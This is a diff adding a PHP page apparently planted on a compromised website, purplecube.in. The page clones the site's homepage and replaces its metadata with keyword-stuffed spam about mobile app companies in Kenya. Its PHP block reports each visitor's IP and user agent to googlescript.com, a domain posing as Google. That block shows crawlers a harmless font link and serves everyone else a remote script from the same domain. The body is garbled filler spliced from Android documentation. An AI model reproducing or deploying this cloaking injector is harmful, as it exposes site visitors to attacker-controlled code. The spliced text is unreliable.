@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Mobile Application Companies In Kenya Olympian Huber Sipapu mobile application companies in kenya Sandyspider Meticulous Accommodation Benefit | purplecube.in</title>
+<meta name="description" content="And make sure once you plant it by labeling your seed, you supply your seed a job. | Mobile Application Companies In Kenya" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=lib-js&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/lib-js"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>mobile application companies in kenya Ice Abbey Tarant</h1>Storyboards use keyframes to animate property changes. <p>OnGenericMotionListener Interface definition for a callback to be invoked when a generic motion event is dispatched to this view. Theme getTheme() Return the Theme object associated with this Context. For details and restrictions, see the Content License. If not set, the default value will be true if "scrollbars" has the vertical scrollbar set, else it will be false. They provide no security (anyone can access them), no protection (anyone can modify them), and many other problems. CursorFactory factory, DatabaseErrorHandler errorHandler) Open a new private SQLiteDatabase associated with this Devepopment application package. This corresponds to the global attribute resource symbol scrollbarAlwaysDrawHorizontalTrack. AccessibilityDelegate This class represents a delegate that can be registered in a View to enhance support via composition rather via inheritance.</p> <h2>The purchase price industry can look for posts which are linked to products that are selling.</h2>OnAttachStateChangeListener Interface definition for a <strong>mobile application companies in kenya</strong> callback to be invoked when this view is attached or detached from its window. <p>The recommended pattern is to use a non-sticky broadcast to report that something has changed, with another mechanism for apps to retrieve the current value whenever desired. Multi-pane layouts result in a better visual balance on tablet screens, while offering <a href="http://purplecube.in/how-much-does-the-average-mobile-app-cost-to-make">how much does the average mobile app cost to make</a> more utility and legibility. The recommended pattern is to use a non-sticky broadcast to report that something has changed, with another mechanism for apps to retrieve the current value whenever desired. Returns boolean Return true if event population was completed. This corresponds to the global attribute mobile mobile application companies in kenya application design and development symbol scrollY. This corresponds to the global attribute resource symbol scrollbarAlwaysDrawVerticalTrack. Must be a boolean applicatkon, either "true" or "false". Compound views combine several single views from a handset UI (above) into a richer, more efficient UI for mobile application companies in kenya tablets (below).</p> <h2>she d a core number of friends; she was a good student.</h2>Related Methods androidscrollbarAlwaysDrawHorizontalTrack Defines whether the horizontal scrollbar track should always be drawn. <p>ComponentName startService(Intent service) Request that a given application service be started. OnFocusChangeListener Interface definition for a callback to be invoked when the focus state of a view changed. This corresponds to the global attribute mobile application design and development symbol isScrollContainer. This corresponds to the global attribute resource symbol scrollbarDefaultDelayBeforeFade. They provide no security (anyone can access them), no protection (anyone can modify them), and many other problems. OnApplyWindowInsetsListener Listener for applying window insets on a view in a custom way. Be sure to call this implementation for key shortcut events that should be handled normally.</p> <h2>The coating was hardly cool, nonetheless it was ugly at all.</h2>Controls whether the view's window should keep the screen on while visible. <p>DragShadowBuilder Creates an image mobile application design and development the system displays during the drag and drop operation. To continue, mobile application companies in kenya navigate to this page on a supported <strong>mobile application companies in kenya</strong> web browser, such as Google Chrome. Except as noted, this content is licensed under Creative Commons Attribution 2. Available units are px (pixels), dp (density-independent pixels), sp (scaled pixels based on preferred font size), in (inches), mm (millimeters). You can implement the interface BluetoothProfile to write your own classes to support a particular Bluetooth profile. Parameters event The key shortcut event. OnHoverListener Interface definition for a callback to be invoked <strong>mobile application companies in kenya</strong> when a hover event is dispatched to this view. OnCreateContextMenuListener Interface definition for a callback to be invoked when the context menu for this view is being built.</p> <h2>A creator as a person have to be quite hopeful.</h2>In this project, we're going to move a rectangle, fade it away, and then bring it back into view. <p>CursorFactory factory) Open a mobile application companies in kenya new private SQLiteDatabase associated with this Context's application package. Parameters event The event. BaseSavedState Base class for derived classes that want to save mobile application design and development restore their own state in onSaveInstanceState(). OnClickListener Interface definition for a callback to be invoked when a view is clicked. Must <a href="http://purplecube.in/my-create-app">my create app</a> be a boolean value, either "true" or "false". Must be a boolean value, either "true" or "false".</p> <h2>The modification is appreciated by me around the rib error; this article has been updated by me.</h2>Related Methods androidscrollbarAlwaysDrawVerticalTrack Defines whether the vertical scrollbar track should always be Must be a boolean value, either "true" moble "false". <p>Sticky should not be used. Returns True if this event was consumed. Context abstract boolean bindService(Intent service, ServiceConnection conn, int flags) Connect to an application service, creating it if deskgn. Sticky broadcasts should not be used. Related Methods androidscrollbarDefaultDelayBeforeFade Defines the delay in milliseconds that a scrollbar waits before fade out. They provide no security (anyone can access <a href="http://purplecube.in/mobile-development-companies-in-sweden">mobile development companies in sweden</a> them), no protection (anyone can modify them), and many other problems.</p> <h2>Research papers and published essays store lots of relevance in most student s existence.</h2>Retrieved November 1, 2014. <p>A MeasureSpec encapsulates the layout requirements passed from parent to child. For example, application could receive broadcasts that indicate mobile application design and development <a href="http://purplecube.in/new-york-mobile-app-development">new york mobile app development</a> connected device's battery level and could notify the user or take other action as needed. The recommended mobile application mobile application companies in kenya design and development is to use mobile application design and development non-sticky broadcast to report that something has changed, with another mechanism for apps to retrieve the current value whenever desired. You can override this to intercept all touch screen before <a href="http://purplecube.in/the-teaching-company-app">the teaching company app</a> they are dispatched to the window. Retrieved November 1, 2014. This corresponds to the global attribute resource symbol keepScreenOn.</p> <h2>That is the element that needs hardwork and responsibility.</h2>Must be an integer value, such as "100". <p>Animations in XAML are based on the concept of storyboards. OnDragListener Interface definition for a callback to be invoked when a drag is being dispatched to this view. Retrieved November 1, 2014.</p>
+                  </div>
+               </div>
